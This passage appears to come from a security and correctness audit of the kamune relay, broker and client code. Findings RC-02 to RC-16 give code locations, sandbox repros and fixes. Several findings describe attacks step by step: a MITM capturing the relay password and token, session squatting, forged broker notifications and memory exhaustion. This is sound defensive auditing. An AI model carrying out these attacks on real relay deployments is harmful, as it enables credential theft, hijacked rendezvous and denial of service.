grep for SetReadLimit hits only cmd/relay/internal/handlers/ws_handler.go:50,52 (`conn.SetReadLimit(int64(maxSize))`). The client side calls `websocket.Dial(...)` at pkg/relayconn/dial.go:22,47 and listener.go:50,72 and never sets a limit. go.mod pins coder/websocket v1.8.15. kamune.go:62-69 defines buckets {512,1024,4K,16K,32K,frameTargetSize} and kamune.go:74 sets bumpProbabilities {80,15,4,1}. enigma.go:47 adds nonce+tag (40 bytes), channel.go:74 Seals the relay leg, and conn.go RelayConn.WriteBytes wraps the data in pb.Frame{Msg}. Sandbox test (pkg/relayconn/zz_limit_test.go): a server with SetReadLimit(65536) writes N bytes, and the relayconn wsAdapter over a default websocket.Dial [...]
```

</details>

#### RC-02

**Top padding bucket (65535-byte kamune frame) becomes 65559 bytes after relay wrapping and cannot cross any relay transport**

Severity: High · Category: correctness · Also affects: kamune

Locations: `pkg/relayconn/conn.go:95-104`, `pkg/relayconn/framing.go:51-57`, `pkg/exchange/channel.go:74-80`, `kamune.go:28`, `kamune.go:62-69`, `serde.go:149-168` and 17 more

frameTargetSize = math.MaxUint16 - 40 (kamune.go:28), so a bucket-6 frame is exactly 65535 bytes after enigma. RelayConn.WriteBytes wraps it in pb.Frame{Msg{Data}} (+8 bytes) and seals it with the relay HPKE channel (+16), giving 65559 bytes. On TCP/TLS, Framing.WriteBytes rejects anything above 65535 and Send fails. exchange.Channel seals before writing, so the HPKE sender sequence advances even though nothing was sent, and the next frame fails to open at the relay, which tears down the pair. On WS the client write succeeds, the relay's read limit (max_message_size 65536) is exceeded, the relay closes the sender's connection, and ClosePeerChannel closes the other peer. The sender's Send has already returned nil. SPEC 9.4 requires a Conn to carry any frame up to 65535 bytes, and maxTransportSize (61439) tells callers about 61 KiB messages work. Over the relay none above about 32 KiB do. Smaller messages reach the top bucket through the random bump: about 1 percent of 1-4 KiB, 5 percent of 4-16 KiB, 20 percent of 16-32 KiB, and 100 percent above that.

**Attack scenario.** No attacker is needed. A user sends a 40 KB message over a tcp:// or tls:// relay and Send fails every time with 'frame size 65559 exceeds maximum 65535'; the next send then drops the session. Sandbox runs: tcp msgSize=40000 gave 0/51 successful sends; msgSize=10000 failed at message 3 to 43; msgSize=8000 failed at send 4 and 19; msgSize=2000 failed after 47 to 77 sends; msgSize=20000 failed after 10. Over 2000 sends, the share of relay-leg frames above 65535 was 1.35 percent for 2000 B messages, 4.75 percent for 10000 B, 20.6 percent for 20000 B and 100 percent for 40000 B. Over ws the relay closes both peers and the message is lost.

**Recommendation.** Reserve relay overhead in the kamune frame budget: lower frameTargetSize by the worst-case wrapping overhead (Frame 8 + HPKE 16 plus margin, for example MaxUint16 - 40 - 64), or let a Conn report its maximum payload so padSignedTransport never picks a bucket it cannot carry. Lower maxTransportSize to match. Alternatively, raise relay framing and max_message_size to cover the overhead (for example 65535 + 64, or a 32-bit length with an explicit cap). In exchange.Channel, check length before Seal so a rejected write does not advance state. Add a regression test that sends a frameTargetSize payload through each relay transport.

<details><summary>Evidence</summary>

```text
kamune.go:28: frameTargetSize = math.MaxUint16 - encryptionOverhead
pkg/relayconn/conn.go:96-103: frame := &pb.Frame{Kind: &pb.Frame_Msg{Msg: &pb.Message{Data: data}}} ... return rc.channel.WriteBytes(b)
pkg/relayconn/framing.go:53: if len(data) > math.MaxUint16 { return fmt.Errorf("frame size %d exceeds maximum %d", ...)
pkg/exchange/channel.go:74: encrypted, err := ch.sender.Seal(nil, data)  (then conn.WriteBytes)
Sandbox:
  kamune frame 65511 -> err=<nil>; 65512 -> frame size 65536 exceeds maximum 65535; 65535 -> frame size 65559 exceeds maximum 65535
  tcp: send 40000: writing: write encrypted: frame size 65559 exceeds maximum 65535; tcp: send 100 -> server recv err: connection has been closed
  WS dialer WriteBytes(65535) err=<nil>; second write err = use of closed network connection

Verification:

kamune.go:28 frameTargetSize = math.MaxUint16 - encryptionOverhead (40)
transport.go:167 t.conn.WriteBytes(t.encoder.Encrypt(payload))
pkg/relayconn/conn.go:96-103 frame := &pb.Frame{Kind: &pb.Frame_Msg{Msg: &pb.Message{Data: data}}} ... rc.channel.WriteBytes(b)
pkg/exchange/channel.go:74-77 encrypted, err := ch.sender.Seal(nil, data) ... ch.conn.WriteBytes(encrypted)
pkg/relayconn/framing.go:53 if len(data) > math.MaxUint16 { return fmt.Errorf("frame size %d exceeds maximum %d"...
ws_handler.go:50 conn.SetReadLimit(int64(maxSize)); config.toml:11 max_message_size = 65536
Sandbox, proto.Size(Frame{Msg{Data:n}})+16: 65511 -> 65535; 65512 -> 65536; 65535 -> 65559
Sandbox, padSignedTransport, [...]

kamune.go:28 `frameTargetSize = math.MaxUint16 - encryptionOverhead`; bucket 6 = frameTargetSize (kamune.go:68).
pkg/relayconn/conn.go:96 `frame := &pb.Frame{Kind: &pb.Frame_Msg{Msg: &pb.Message{Data: data}}}` then `rc.channel.WriteBytes(b)`.
pkg/relayconn/framing.go:53 `if len(data) > math.MaxUint16 {` return error.
pkg/exchange/channel.go:74 `encrypted, err := ch.sender.Seal(nil, data)` before conn.WriteBytes.
Sandbox copy: go test ./pkg/relayconn -run TestZZSize -v
  kamune frame 65511 -> pb.Frame 65519 -> sealed 65535
  kamune frame 65512 -> pb.Frame 65520 -> sealed 65536
  kamune frame 65535 -> pb.Frame 65543 -> sealed 65559
  big write err=write encrypted: frame size 65559 exceeds [...]
```

</details>

#### RC-03

**Relay PSK and session token are sent to an unauthenticated HPKE peer, so an active MITM on ws/tcp or insecure TLS captures them**

Severity: Medium · Category: security · Also affects: relay

Locations: `pkg/relayconn/auth.go:9-39`, `pkg/relayconn/dial.go:106-135`, `pkg/relayconn/listener.go:117-147`, `pkg/exchange/channel.go:106-145`, `pkg/relayconn/options.go:10-12`, `cmd/relay/internal/handlers/ws_handler.go:124-153` and 18 more

relayHandshake and listenHandshake run exchange.Initiate with whatever endpoint answers. The relay has no long-term key that clients pin, so the HPKE channel authenticates nobody. sendAuth then sends the raw password in pb.Auth{Psk} and treats any Frame_Auth reply as success, so the client never checks that the server knows the PSK. Register then sends the session token. The HPKE layer stops passive observers only. Over plain ws or tcp (ws is the default when no scheme is given in bus and daemon; tui always uses ws), or wss/tls with ?insecure=true (needed for the relay's default self-signed certificate), an active on-path attacker can terminate HPKE as the relay. RELAY.md:284 says 'In PSK mode, the password is transmitted inside the HPKE-encrypted channel', which implies protection that holds only against passive observers.

cmd/relay/README.md:74-80 tells users to pin the relay certificate, but no client has a pin option: the only Option fields are password and token (pkg/relayconn/options.go:10-17). RELAY.md:284 says the PSK is "transmitted inside the HPKE-encrypted channel" without saying that this protects only against passive observers.

**Attack scenario.** An attacker on the client's network (public Wi-Fi, ISP) intercepts a ws:// or tcp:// connection to a PSK-protected relay, runs exchange.Accept toward the client, reads Frame.Auth{psk} and Register{token}, replies with an Auth frame, and proxies to the real relay. It now has the deployment password and can use the relay freely, which defeats the drive-by token harvesting gate. With the token it can JOIN the listener's session first, consuming it and denying the real dialer, or observe all pairing metadata.

**Recommendation.** Authenticate the relay leg: pin a relay static HPKE key (in the relay address or config) and use HPKE Auth mode, or require verified TLS whenever a password is configured and refuse Auth over an unauthenticated channel. Replace plaintext PSK transmission with HPKE mode_psk or a challenge-response bound to the HPKE transcript (for example HMAC(PSK, exporter || nonce)), and require the relay to prove PSK knowledge in its reply. Use a PAKE for low-entropy passwords. Default to wss/tls and warn on ws/tcp with a password. Fix RELAY.md 'Authentication Modes'.

<details><summary>Evidence</summary>

```text
pkg/relayconn/auth.go: auth := &pb.Frame{Kind: &pb.Frame_Auth{Auth: &pb.Auth{Psk: []byte(password)}}}
auth.go:36-38: if frame.GetAuth() == nil { return fmt.Errorf(...) } return nil  (any Auth frame accepted)
pkg/relayconn/dial.go:106: ch, err := exchange.Initiate(rw)
dial.go:117-119: if o.password != "" { if err := sendAuth(ch, o.password); err != nil {
pkg/exchange/channel.go:111-115,136: ephemeral key, hpke.NewSender(remotePublic, kdf, aead, nil)  (no peer key check)
cmd/bus/relay.go:191: return "ws", host, insecureOverride
RELAY.md:284: 'In PSK mode, the password is transmitted inside the [...]
```

</details>

#### RC-04

**Static relay and P2P tokens are SHA-256 of both public keys; anyone who knows the keys can squat relay sessions or take the broker match and learn the listener's IP:port**

Severity: Medium · Category: security · Also affects: relay, daemon, bus

Locations: `pkg/relayconn/token.go:125-137`, `cmd/relay/internal/services/session.go:78-137`, `cmd/relay/internal/services/session.go:166-187`, `cmd/relay/internal/handlers/ws_handler.go:98-112`, `pkg/relayconn/listener.go:227-233`, `cmd/bus/p2p.go:212-238` and 18 more

TokenFromKeys returns SHA256(min(pk)||max(pk)) with no secret and no domain-separation label. It is the same value forever for a pair, and bus and daemon use it for relay listen and dial when no ECDH token exists. RELAY.md presents the risk as probing that only leaks existence. In the code a probe changes state. Join marks the session consumed. When the prober disconnects, the relay handler's defer calls ClosePeerChannel, which closes the listener's channel, so the RelayListener readPump exits. A prober that stays connected and sends nothing holds the pairing until session_ttl; the listener sees nothing because RelayListener only creates a RelayConn on the first Msg, and the real dialer gets ErrTokenConsumed. CreateWith rejects duplicates with ErrTokenInUse, so an attacker who registers MODE_CREATE first and re-registers at each token_ttl blocks the legitimate listener.

The broker path has the same root cause. Static P2P tokens are the same hash truncated to 16 bytes on the wire. handleStaticRegister (cmd/relay/internal/broker/broker.go:237-260) matches any REGISTER that carries a held token from a different X25519 key, and sendPeerMatched (broker.go:287-290) sends that registrant the held peer's observed IPv4:port and its broker X25519 key before any kamune verification. The token travels in plaintext in every REGISTER, so a passive observer of one REGISTER can reuse it. Listeners re-register every 30 s, so an attacker can match again after each refresh and follow the listener's address. DAEMON.md:562-564 and :685-687 describe these tokens as ECDH-derived and peer-exclusive (see the docs section).

**Attack scenario.** An attacker gets two contacts' Ed25519 public keys from a contact card, QR export, key directory or compromised device. It computes T and every few seconds sends Register{MODE_JOIN, T} and disconnects, tearing down the waiting listener each time. Or it holds Register{MODE_CREATE, T} so the listener's registration fails with 'token already in use'. The pair cannot rendezvous on that relay until they move to ECDH tokens, which first need a successful session.

**Recommendation.** Derive static tokens from a shared secret, for example a static-static X25519 DH with a 'kamune/relay-static/v1' label. At minimum add a domain label. On the relay, do not close the listener when a dialer that never sent a Message disconnects, and require the listener to confirm the pairing. Update RELAY.md to state the DoS impact. For the broker, send only a hash of a secret token in REGISTER, and do not release IP:port until both sides prove knowledge of a shared secret.

<details><summary>Evidence</summary>

```text
token.go:133-136: h := sha256.New(); h.Write(lo); h.Write(hi); return h.Sum(nil), nil
session.go:97-99: if _, exists := sm.sessions[key]; exists { return ErrTokenInUse }
session.go:121-128: if sess.dialer != nil { ... return ErrTokenConsumed } ... sess.dialer = dialer
ws_handler.go:109-111: hub.ClosePeerChannel(registeredToken, ch); hub.Unregister(...)
listener.go:271-291: RelayConn created only inside deliver() on the first Msg
```

</details>

#### RC-05

**Broker NOTIFY has no origin authentication: anyone who knows the client's X25519 public key can forge or replay PEER_MATCHED**

Severity: Medium · Category: crypto

Locations: `pkg/relayconn/broker/client.go:265-282`, `pkg/relayconn/broker/client.go:202`, `pkg/relayconn/broker/codec.go:158-180`, `pkg/relayconn/broker/codec.go:283-310`, `cmd/daemon/broker.go:136-150`, `cmd/daemon/broker.go:206-238` and 6 more

The NOTIFY AEAD key is SHA256(X25519(client_priv, broker_eph_pub)), and the client reads broker_eph_pub from the packet header. The broker has no long-term key, so this is anonymous ECDH. The client's X25519 public key and the token travel in plaintext in every REGISTER (codec.go BuildRegister), and the broker hands the key to every matched peer as OtherPeerEphPub. BrokerClient keeps one key for the whole process in bus and daemon, so a learned key stays usable and links all registrations. Anyone who knows that key can pick an ephemeral key and seal a NOTIFY the client accepts. Replay also works because the client holds no per-registration state. The only remaining filter is the UDP source check in the bus and daemon WaitMatch loops, which an on-path or source-spoofing attacker can pass. Client.Listen discards the source address entirely (client.go:202). PEER_MATCHED IP:port is used directly as the hole-punch and KCP target with no validation, and OtherPeerEphPub is never used to authenticate the punched peer. RELAY.md says 'The shared secret prevents forgery', 'The shared AEAD already prevents forgery', and that a replayed NOTIFY fails after re-registration. These statements are false for this code.

**Attack scenario.** An on-path attacker sees B's REGISTER (token and X25519 pub in clear). It sends B's punch socket a NOTIFY(PEER_MATCHED) with that token and an attacker-chosen IP:port, spoofing the broker source address. B's WaitMatch accepts it, sends NAT kicks and KCP to that address, and starts a kamune handshake with the attacker. Rendezvous is hijacked or denied and B reveals its address; impersonation still needs a lax verification mode (Quick or Auto-Accept). The same NOTIFY can aim B's UDP traffic at a third-party host. A former match partner learns B's key and can repeat this for the life of the process. Sandbox TestRT_ForgeNotifyFromPublicKeyOnly: 'forged notify accepted: 203.0.113.66:6666'.

**Recommendation.** Correct RELAY.md: NOTIFY AEAD gives confidentiality only, not origin authentication or replay protection. For authenticity, give the broker a long-term key that clients pin and derive the NOTIFY key from static-ephemeral DH with it (or encrypt REGISTER to that key), include a per-registration client nonce in the NOTIFY plaintext and check it, and rotate the client X25519 key per registration. Bind PEER_MATCHED to the expected peer via OtherPeerEphPub checked over the authenticated channel. Validate payload.IP (reject unspecified, broadcast, multicast). Make Client.Listen check the source address.

<details><summary>Evidence</summary>

```text
pkg/relayconn/broker/client.go:272-281:
  brokerPub, err := ecdh.X25519().NewPublicKey(brokerEphPub) // from packet
  shared, err := c.key.ECDH(brokerPub)
  key := sha256.Sum256(shared)
  return OpenNotify(key[:], brokerEphPub, nonce, sealed)
client.go:202: n, _, err := conn.ReadFromUDP(buf)
codec.go:173-174: pkt = append(pkt, tk...); pkt = append(pkt, pk...)  (cleartext)
cmd/bus/broker.go:54: k, err := ecdh.X25519().GenerateKey(rand.Reader)  // once per process
cmd/daemon/broker.go:136: only src.IP/Port == broker address check
RELAY.md:874: 'The shared AEAD already prevents forgery;'; [...]
```

</details>

#### RC-06

**RelayConn buffers incoming frames without bound, so a relay or token holder can exhaust client memory**

Severity: Medium · Category: dos

Locations: `pkg/relayconn/conn.go:124-132`, `pkg/relayconn/conn.go:138-160`, `pkg/relayconn/listener.go:253-288`, `server.go:203`, `cmd/bus/verifier.go:169`, `cmd/daemon/verifier.go:13`

readPump decrypts each relay frame and pushData appends the payload to rc.buf with no cap on count or bytes and no back-pressure. Data is drained only when kamune calls ReadBytes. While the server runs the remote verifier nothing reads; bus and daemon wait up to 2 minutes for the user, and the 30 s handshake deadline applies only to I/O. The read deadline only applies inside ReadBytes, so it does not limit growth. The relay can inject Msg frames at any time, and so can any peer that joined the token before authentication.

**Attack scenario.** A malicious relay operator, or anyone holding the listener's token (for static tokens, anyone with both public keys), joins, sends a valid HPKE exchange and an Introduce with an unknown key so the listener shows a verification prompt, then streams 64 KiB Msg frames. At 50 MB/s for 2 minutes that is about 6 GB, which ends in OOM. Sandbox: 5000 frames of 60 KB pushed to an accepted, unread listener RelayConn grew the heap by 495 MiB in 3 seconds.

**Recommendation.** Bound the buffer by bytes and frame count (for example 1 to 4 MiB). When full, stop calling channel.ReadBytes until the consumer drains it, or close the connection. Apply the handshake deadline to the verifier callback.

<details><summary>Evidence</summary>

```text
conn.go:124-127: func (rc *RelayConn) pushData(data []byte) { rc.bufMu.Lock(); rc.buf = append(rc.buf, data); rc.bufMu.Unlock()
conn.go:150-151: case *pb.Frame_Msg: rc.pushData(v.Msg.GetData())
bus/verifier.go:169: const verificationTimeout = 2 * time.Minute
Sandbox: zz_repro_test.go:42: buffered frames=5000 heap growth=495 MiB
```

</details>

#### RC-07

**Static-token broker P2P never matches: 32-byte token truncated to 16 on the wire but compared at 32**

Severity: Medium · Category: correctness · Also affects: daemon, bus

Locations: `pkg/relayconn/token.go:136`, `pkg/relayconn/broker/codec.go:32`, `pkg/relayconn/broker/codec.go:162`, `pkg/relayconn/broker/codec.go:260`, `cmd/bus/broker.go:190`, `cmd/daemon/broker.go:145` and 17 more

TokenFromKeys returns a 32-byte SHA-256. BuildRegister truncates the token to 16 bytes (tokenSize = 16) without an error, and the broker matches and echoes the 16-byte value in PEER_MATCHED. WaitMatch in bus and daemon compares the 16-byte payload.Token to the original 32-byte token with bytes.Equal, which is always false, so every PEER_MATCHED is skipped. Static mode for broker P2P never connects. The bus gives up after 30 s. The daemon passes d.ctx with no timeout and has no cancel-dial command, so the dial goroutine waits forever. RELAY.md documents SHA256(...)[:16], which the clients do not implement.

**Attack scenario.** No attacker is needed. A user picks a known peer for P2P via the broker. The broker matches both sides and consumes the registration, the dialer discards the match, and the session never starts. In the daemon each such dial leaks a goroutine.

**Recommendation.** Truncate the static token to 16 bytes in one place (for example a broker.StaticToken(a, b) helper) and use it for registration and comparison. Make BuildRegister reject tokens that are not 0 or 16 bytes. Add a timeout to the daemon WaitMatch call.

<details><summary>Evidence</summary>

```text
token.go:136: return h.Sum(nil), nil  (32 bytes)
codec.go:32: tokenSize = 16; codec.go:162: tk := padOrTruncate(token, tokenSize)
codec.go:260: out.Token = plaintext[1 : 1+tokenSize]
daemon/broker.go:145: if len(token) > 0 && !bytes.Equal(payload.Token, token) { continue }
Sandbox: static token len=32, register token len=16, notify token len=16, bytes.Equal(notify, static)=false
```

</details>

#### RC-08

**RelayListener only releases its relay socket in Close: Stop on an idle listener and readPump death leave the socket, goroutines and relay session alive**

Severity: Medium · Category: resource-leak

Locations: `pkg/relayconn/listener.go:186-196`, `pkg/relayconn/listener.go:218-225`, `pkg/relayconn/listener.go:227-233`, `pkg/relayconn/listener.go:265-269`, `cmd/bus/relay.go:79-86`, `cmd/bus/relay.go:150-157` and 5 more

RelayListener closes its exchange channel (and so the TCP/TLS/WS socket to the relay) in only two places: Close(), and rc.closeFn when an active RelayConn closes after Stop(). Two common paths reach neither. (1) Stop() with no active conn (listener.go:218-225) sets stopped and drains l.accept, but does not cancel l.ctx or close the channel. The relay keeps the session registered and joinable, the listener's readPump keeps running, and deliver() drops every Msg because stopped is set and l.conn is nil (listener.go:265-269). An Accept() call that is already blocked checks stopped only on entry (listener.go:187), so it stays blocked on l.accept/l.ctx.Done(). (2) When readPump hits a read error (relay closed, network drop), it runs only `defer l.cancel()` (listener.go:228). closeFn is never called, so for TCP/TLS the fd stays open in CLOSE_WAIT. The bus and daemon call Stop() on idle listeners: from the token expiry timer (cmd/bus/relay.go:150-157) and 4 s after a token is consumed (cmd/bus/app.go:963-965, cmd/daemon/network.go:1630-1631). In the second case l.conn is already nil if the kamune handshake failed in those 4 s, for example because the verifier rejected the peer. The bus reconnect loop waits on Dead() and then registers a new listener (cmd/bus/relay.go:404-410). It never closes the dead one, and multiListener keeps every listener until server shutdown.

**Attack scenario.** A peer that holds a relay token connects and is rejected by the verifier. server.serve closes the RelayConn, which clears l.conn but leaves the channel open (the known issue). 4 s later markRelayTokenConsumed calls Stop() on the now idle listener. The dialer stays paired at the relay. The listener's socket, readPump goroutine and the multiListener goroutine blocked in Accept stay alive until the relay's session_ttl (60m in config.toml, unlimited when 0) or until the dialer disconnects. Every rejected token repeats the leak. Separately, each relay drop on a TCP/TLS relay leaves one CLOSE_WAIT fd and its HPKE channel in the bus until the server is stopped.

**Recommendation.** In Stop(), when l.conn is nil, cancel l.ctx and close the channel under closeOnce, the same way rc.closeFn does when stopped. In readPump, call the closeOnce/closeFn path on exit, not only l.cancel(). Have Accept wake on a stop signal, not only on ctx.Done(). Add a test where Stop() on an idle listener closes the relay side's connection.

<details><summary>Evidence</summary>

````text
listener.go:218-225:
```go
func (l *RelayListener) Stop() {
	l.stopped.Store(true)
	select {
	case rc := <-l.accept:
		rc.Close()
	default:
	}
}
```
listener.go:227-233: `func (l *RelayListener) readPump() {\n\tdefer l.cancel()` with no closeFn call. Repro in a private copy: setupListener, start Accept in a goroutine, call Stop(). The relay side's WriteBytes still succeeds, the blocked Accept does not return within 500 ms, and listener.ctx.Err() is nil. The existing TestListenAccept_AfterStop passes only because it defers Listener.Close().
````

</details>

#### RC-09

**ListenRelayTCP/TLS and DialRelayTLS ignore context cancellation and hang on a stalled relay**

Severity: Low · Category: dos

Locations: `pkg/relayconn/listener.go:96-160`, `pkg/relayconn/dial.go:72-86`, `pkg/relayconn/dial.go:98-99`, `pkg/relayconn/framing.go:36-48`, `cmd/bus/network.go:123`, `cmd/bus/network.go:436` and 1 more

relayHandshake uses context.AfterFunc(ctx, closeFn) so a cancelled ctx unblocks reads. listenHandshake has no equivalent and sets no deadline. For TCP/TLS adapters ctx is used only for the dial, so exchange.Initiate, sendAuth and the Registered read block until the relay sends data or closes. DialRelayTLS and ListenRelayTLS use tls.DialWithDialer with a zero net.Dialer, which ignores ctx and has no handshake timeout; the AfterFunc in relayHandshake is installed only after the TLS handshake returns. bus calls listenRelayTracked with context.Background(). WS listeners are not affected because wsAdapter reads with ctx.

**Attack scenario.** A relay or tarpit accepts TCP and never answers. ListenRelayTCP, ListenRelayTLS and DialRelayTLS block until the peer closes, holding the socket and a goroutine. The bus 'start server' action or relayReconnectLoop stays stuck. Sandbox: with a 300-500 ms ctx deadline, ListenRelayTCP and DialRelayTLS were still blocked after 3-5 s.

**Recommendation.** Add stop := context.AfterFunc(ctx, closeFn); defer stop() in listenHandshake. Use (&tls.Dialer{}).DialContext(ctx, ...) for TLS. Apply a default handshake deadline (for example 30 s) until Registered is received. Add a listener test like TestRelayHandshake_CancelUnblocksTCP.

#### RC-10

**RelayListener keeps a rejected peer paired and starts a new handshake for each of its frames**

Severity: Low · Category: dos

Locations: `pkg/relayconn/listener.go:253-298`, `pkg/relayconn/listener.go:227-251`, `pkg/relayconn/conn.go:116-122`, `server.go:141`, `cmd/tui/relayserver.go:22-28`, `cmd/bus/app.go:944-964` and 1 more

When the kamune server closes a listener-side RelayConn after a rejection or handshake failure, closeFn only sets l.conn = nil unless Stop was called. The relay pairing, the shared HPKE channel and readPump stay alive. The next Msg from the same peer makes deliver() create a new RelayConn and pass it to Accept, so the peer can rerun HPKE, Introduce and the verifier on one relay registration until session_ttl. Only one RelayConn is active at a time, so the retries run one after another, not in parallel. tui and other library users never call Stop. bus and daemon call Stop 4 s after the first Accept, which limits the retry window to those 4 s.

**Attack scenario.** An attacker with the token joins, is rejected by the verifier, and sends a new HPKE public key frame on the same relay connection. Each frame spawns a new server handshake goroutine and, with a prompting verifier, a new prompt, until session_ttl.

**Recommendation.** When a listener RelayConn closes before a kamune session is established, close the shared channel and end the relay pairing. At minimum make one RelayListener produce a single connection by default.

#### RC-11

**broker Client.Listen binds 127.0.0.1 and is never the REGISTER source, so it cannot receive NOTIFYs**

Severity: Low · Category: correctness

Locations: `pkg/relayconn/broker/client.go:169-225`, `pkg/relayconn/broker/client.go:117-123`, `cmd/relay/internal/broker/broker.go:183-193`

Client.Listen binds 127.0.0.1:0 (client.go:179-183) and never sends from that socket. The broker sends NOTIFY to the REGISTER source address, which is Register's own DialUDP socket (client.go:123), and ignores the claimed IP:port beyond validation (broker.go:183-193). The doc comments at client.go:117-119 and 171-175 say the claimed address is echoed back and that the Listen address can be passed via Register, and both statements are false. Listen also ignores the packet source (client.go:202). There are no production callers; bus and daemon reimplement the logic. No doc references Client.Listen.

**Attack scenario.** A third-party integrator follows the documented Listen then Register flow. No PEER_MATCHED ever arrives and rendezvous hangs until timeout. If they fix the bind address, any UDP sender that knows the client's public key can inject NOTIFYs because there is no source check.

**Recommendation.** Remove or deprecate Listen, or redesign it to read from the same socket that sent REGISTER (or accept a caller-provided *net.UDPConn), bind to the unspecified address, and filter by the broker's address.

#### RC-12

**broker Client.Register/Echo use throwaway sockets; static Register decodes the full 1500-byte buffer and loses an immediate PEER_MATCHED**

Severity: Low · Category: correctness

Locations: `pkg/relayconn/broker/client.go:146-158`, `pkg/relayconn/broker/client.go:120-127`, `cmd/daemon/p2p.go:90-161`, `cmd/daemon/p2p.go:299-340`, `cmd/bus/p2p.go:98-176`, `cmd/bus/p2p.go:179-184` and 2 more

Client.Register and Client.Echo use a fresh DialUDP socket each call and close it on return. The broker stores and refreshes the REGISTER source (broker.go:239 `held.addr = src`), so tokens registered through this path, and every 30 s refresh in runP2PRefresh, point at a closed socket. bus and daemon GenerateP2PToken take this path for random tokens even when a p2p listener runs (that listener is static, or the broker address differs), and for any token when no p2p listener exists. Peers dialing such a token are told to punch to a dead port. In static mode Register passes the full buffer to decodeAssignedToken (client.go:155), so any reply inside the 200 ms window fails AEAD. The refresh loop treats that as fatal and drops the token. The bus comment at p2p.go:179-184 wrongly says the broker refresh keeps the stored address. respondAssignedToken is unused, so the static reply path is untested.

**Attack scenario.** No attacker needed. A daemon user runs generate_p2p_token with no p2p listener and gives the token to a peer. The peer's WaitMatch receives PEER_MATCHED pointing at a closed ephemeral port. If the peer registered first, the generating side's Register returns 'chacha20poly1305: message authentication failed' and the token is removed. A UDP packet spoofed from the broker address triggers the same failure. Sandbox: 'Client.Register err=chacha20poly1305: message authentication failed' and 'held peer told to punch 127.0.0.1:49318 (Register's ephemeral socket, now closed)'.

**Recommendation.** Make the broker Client operate on a caller-supplied long-lived punch socket (the one used for KCP), as WaitMatch does. Pass buf[:n] at client.go:155 and return a PEER_MATCHED to the caller instead of failing. Remove the non-listener branch of GenerateP2PToken or route random tokens through the p2pListener socket. Drop or deprecate claimIP/claimPort. Add a test using respondAssignedToken and a PEER_MATCHED variant.

#### RC-13

**DeriveRelayTokens consumes the next frame of any route and overrides the Transport deadline**

Severity: Low · Category: correctness

Locations: `pkg/relayconn/token.go:233-255`, `transport.go:68-77`, `transport.go:241-243`, `conn.go:263-275`

DeriveRelayTokens is exported but unused in the repo. It calls transport.Receive(&peerSession) without checking the route. If the next frame is a chat message or a ping, it is unmarshalled into SessionData. That either fails or returns ErrECDHPeerKeyMissing, and the frame is lost after recvSequence advances. The function sets an explicit 5 s deadline on the Transport, which suspends conn's per-frame auto deadlines and also applies to concurrent Send. On return it sets the deadline to zero, which drops any explicit deadline the caller had set. A peer CloseTransport is still reported as a wrapped ErrPeerDisconnected.

**Attack scenario.** A library user calls DeriveRelayTokens right after Dial while the peer immediately sends a chat message. The message is consumed as SessionData, ErrECDHPeerKeyMissing is returned, and the chat text is lost.

**Recommendation.** Remove DeriveRelayTokens, or use ReceivePayload, loop until RouteSessionData arrives, return other frames to the caller or name the route in an error, and preserve the previous deadline (or use a context or timer instead of Transport.SetDeadline). Document that no other reader may run concurrently.

#### RC-14

**Dial and listen context also bounds the session lifetime; a timeout ctx kills an established RelayConn**

Severity: Low · Category: correctness

Locations: `pkg/relayconn/dial.go:22-31`, `pkg/relayconn/dial.go:152`, `pkg/relayconn/conn.go:41`, `pkg/relayconn/conn.go:84-90`, `pkg/relayconn/transport.go:69-72`, `pkg/relayconn/listener.go:166` and 1 more

The ctx passed to DialRelay* and ListenRelay* is used for the handshake and then kept. newRelayConn derives rc.ctx from it, and wsAdapter stores it for every Read and Write. When the caller cancels it, which is the normal pattern for a dial timeout with defer cancel(), ReadBytes returns io.EOF and coder/websocket closes the socket. For TCP/TLS the socket and readPump goroutine stay open until Close even though reads report EOF. The API does not document this.

**Attack scenario.** No attacker. A library user writes ctx, cancel := context.WithTimeout(bg, 10*time.Second); defer cancel(); conn, _ := relayconn.DialRelay(ctx, ...) and returns conn. The session dies with ErrConnClosed right after the helper returns. Sandbox: ReadBytes returned EOF immediately after cancelling the dial ctx of an established RelayConn.

**Recommendation.** Use ctx only for the handshake. Give RelayConn and wsAdapter a context owned by Close, or use context.WithoutCancel(ctx) after the handshake. Otherwise document that ctx must outlive the connection.

#### RC-15

**RelayConn.SetDeadline does not affect a ReadBytes that is already blocked**

Severity: Low · Category: correctness

Locations: `pkg/relayconn/conn.go:51-93`, `pkg/relayconn/conn.go:106-114`, `transport.go:240-243`

RelayConn.ReadBytes reads rc.deadline once per loop and arms a timer from it. SetDeadline stores the new value and does not wake blocked readers. A read blocked with no deadline ignores a later SetDeadline(now). A read with a deadline still returns os.ErrDeadlineExceeded at the old time after SetDeadline(time.Time{}). This differs from net.Conn semantics and from kamune's TCP conn (conn.go:37 documents that type). No in-repo caller sets the deadline concurrently with a blocked read. Library users calling Transport.SetDeadline (transport.go:241) to abort a Receive on a relay connection are affected.

**Attack scenario.** A caller tries to abort a stuck Transport.Receive on a relay connection by calling Transport.SetDeadline(time.Now()) from another goroutine. The read stays blocked until data arrives or the relay closes.

**Recommendation.** Have SetDeadline signal a deadline-change channel that ReadBytes selects on, so a blocked read re-evaluates the deadline.

#### RC-16

**Listener-side RelayConn has no closed state; a repeated Close clears the newer conn from l.conn and orphans it**

Severity: Low · Category: concurrency

Locations: `pkg/relayconn/listener.go:271-288`, `pkg/relayconn/conn.go:116-122`, `pkg/relayconn/conn.go:95-104`, `transport.go:177-183`, `server.go:141`, `cmd/bus/relay.go:60-63` and 2 more

The deliver() closeFn sets l.conn=nil unconditionally (listener.go:272-275). RelayConn.Close (conn.go:116-122) has no once-guard, and RelayConn.WriteBytes (conn.go:95-104) does not check rc.ctx. Transport.Close/CloseAbort and serve's defer (server.go:141) both close the Conn. The bus trackingConn.Close (cmd/bus/relay.go:60-63) guards only onClose, so RelayConn.Close runs twice on a local DisconnectSession (network.go:868) or keepalive CloseAbort (messaging.go:216). If the listener is not yet stopped (within 4 s of accept) and the paired peer sends a frame between the two closes, the second close orphans the new conn. The daemon is not affected: its trackingConn wraps Conn.Close in sync.Once (cmd/daemon/relay.go:56-65).

**Attack scenario.** A peer connected through the relay ends the session and immediately resends its HPKE opening frames. The listener splits them across two RelayConns: c2 gets the first frame and c3 gets the rest. Both handshakes fail, and a stalled serve goroutine is tied up for the 30 s handshake timeout. Repeating this keeps the listener in broken states. Only the paired dialer can trigger it, so the impact is limited.

**Recommendation.** Make RelayConn.Close idempotent with a sync.Once. In the deliver closeFn, clear l.conn only when `l.conn == rc`. Have RelayConn.WriteBytes return net.ErrClosed once rc.ctx is done.

#### RC-17

